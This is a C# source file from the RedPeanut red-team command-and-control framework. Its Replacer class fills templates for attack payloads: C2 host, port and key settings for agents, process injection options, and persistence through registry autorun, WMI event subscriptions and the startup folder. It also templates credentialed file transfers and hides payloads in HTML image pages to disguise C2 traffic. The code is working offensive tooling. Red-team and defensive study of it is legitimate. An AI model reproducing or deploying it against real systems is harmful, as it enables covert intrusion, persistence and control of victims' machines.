//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Net;
using static RedPeanut.Models;
using static RedPeanut.Utility;

namespace RedPeanut
{
    public static class Replacer
    {
        public static string ReplaceAgentProfile(string src, string serverkey, int targetframework, ListenerConfig config)
        {
            string source = src
                    .Replace("#HOST#", config.GetHost())
                    .Replace("#PORT#", config.GetPort().ToString())
                    .Replace("#PARAM#", config.GetProfile().HttpPost.Param)
                    .Replace("#SERVERKEY#", RedPeanut.Program.GetServerKey())
                    .Replace("#PAGEGET#", ParseUri(config.GetProfile().HttpGet.ApiPath))
                    .Replace("#PAGEPOST#", ParseUri(config.GetProfile().HttpPost.ApiPath))
                    .Replace("#USERAGENT#", config.GetProfile().UserAgent)
                    .Replace("#PIPENAME#", "")
                    .Replace("#COVERED#", config.GetProfile().HtmlCovered.ToString().ToLower())
                    .Replace("#TARGETCLASS#", config.GetProfile().TargetClass)
                    .Replace("#NUTCLR#", ReadResourceFile(PL_COMMAND_NUTCLR))
                    .Replace("#SPAWN#", config.GetProfile().Spawn)
                    .Replace("#FRAMEWORK#", targetframework.ToString())
                    .Replace("#MANAGED#", config.GetProfile().InjectionManaged.ToString());

            string headers = "";

            foreach (HttpHeader h in config.GetProfile().HttpGet.Client.Headers)
            {
                try
                {
                    if(!h.Name.Equals("Connection"))
                    {
                        int t = (int)Enum.Parse(typeof(HttpRequestHeader), h.Name.Replace("-", ""), true);
                        headers += string.Format("webHeaderCollection.Add(HttpRequestHeader.{0}, \"{1}\");" + Environment.NewLine, h.Name.Replace("-", ""), h.Value);
                    }
                }
                catch(Exception)
                {
                    Console.WriteLine("[x] Error parsing header {0}", h.Name);
                }
            }
            source = source
                    .Replace("#HEADERS#", headers);

            return source;
        }

        public static string ReplaceAgentProfile(string src, string serverkey, int targetframework, ListenerPivotConfig config)
        {
            string source = src
                    .Replace("#HOST#", config.GetHost())
                    .Replace("#PORT#", "0")
                    .Replace("#PARAM#", "")
                    .Replace("#SERVERKEY#", RedPeanut.Program.GetServerKey())
                    .Replace("#PAGEGET#", "")
                    .Replace("#PAGEPOST#", "")
                    .Replace("#USERAGENT#", "")
                    .Replace("#PIPENAME#", config.GetPipename())
                    .Replace("#COVERED#", "false")
                    .Replace("#TARGETCLASS#", "")
                    .Replace("#NUTCLR#", ReadResourceFile(PL_COMMAND_NUTCLR))
                    .Replace("#SPAWN#", config.GetProfile().Spawn)
                    .Replace("#FRAMEWORK#", targetframework.ToString())
                    .Replace("#MANAGED#", config.GetProfile().InjectionManaged.ToString());

            source = source
                    .Replace("#HEADERS#", "");

            return source;
        }

        public static string ReplaceAgentShooter(string src, string resourceurl, ListenerConfig config)
        {
            string source = src
                    .Replace("#HOST#", config.GetHost())
                    .Replace("#PORT#", config.GetPort().ToString())
                    .Replace("#RESURLCEURL#", resourceurl);

            return source;
        }

        public static string ReplacePersAutorun(string src, string reghive, string url, string keyname, bool encoded)
        {
            string source = src
                    .Replace("#REGHIVE#", reghive)
                    .Replace("#URL#", url)
                    .Replace("#NAME#", keyname)
                    .Replace("#ENCODED#", encoded.ToString());

            return source;
        }

        public static string ReplacePersWMI(string src, string eventname, string url, string processname, bool encoded)
        {
            string source = src
                    .Replace("#EVENTNAME#", eventname)
                    .Replace("#URL#", url)
                    .Replace("#PROCESSNAME#", processname)
                    .Replace("#ENCODED#", encoded.ToString());

            return source;
        }

        public static string ReplacePersStartup(string src, string payload, string filename, bool encoded)
        {
            string source = src
                    .Replace("#URL#", payload)
                    .Replace("#FILENAME#", filename)
                    .Replace("#ENCODED#", encoded.ToString());

            return source;
        }

        public static string ReplaceFileUpLoad(string src, string filesrc, string destpath, string destfilename, string username, string password, string domain)
        {
            string source = src
                    .Replace("#FILEBASE64#", filesrc)
                    .Replace("#FILENAME#", destfilename)
                    .Replace("#PATHDEST#", destpath)
                    .Replace("#USERNAME#", username)
                    .Replace("#PASSWORD#", password)
                    .Replace("#DOMAIN#", domain);

            return source;
        }

        public static string ReplaceFileDownLoad(string src, string filesrc, string username, string password, string domain)
        {
            string source = src
                    .Replace("#FILESRC#", filesrc)
                    .Replace("#USERNAME#", username)
                    .Replace("#PASSWORD#", password)
                    .Replace("#DOMAIN#", domain);

            return source;
        }

        public static string ReplaceHtmlProfile(string src, string targetclass, int payloadlen, string urlimg, int elements, int payloadindex, string[] images)
        {
            Random random = new Random();
            string page = src;

            string uripath = "/images/";
            
            for(int i = 1; i <= elements; i++)
            {
                string pTargetclass = "#{targetclass" + i + "}";
                string pRandomid = "#{randomid" + i + "}";
                string pImagepath = "#{imagepath" + i + "}";
                //Replace with random value except for payload index
                if (i == payloadindex)
                {
                    page = page.Replace(pTargetclass, targetclass)
                        .Replace(pRandomid, payloadlen.ToString())
                        .Replace(pImagepath, uripath + urlimg);
                }
                else
                {
                    page = page.Replace(pTargetclass, "img-responsive")
                        .Replace(pRandomid, random.Next(1,payloadlen).ToString())
                        .Replace(pImagepath, uripath + images[i - 1]);
                }
            }

            return page;
        }

        

        private static string ParseUri(string[] apipath)
        {
            string s = "";
            foreach (string str in apipath)
                s = string.Format("\"{0}\",", str.TrimStart('/'));
            return s.TrimEnd(',');
        }
    }
}
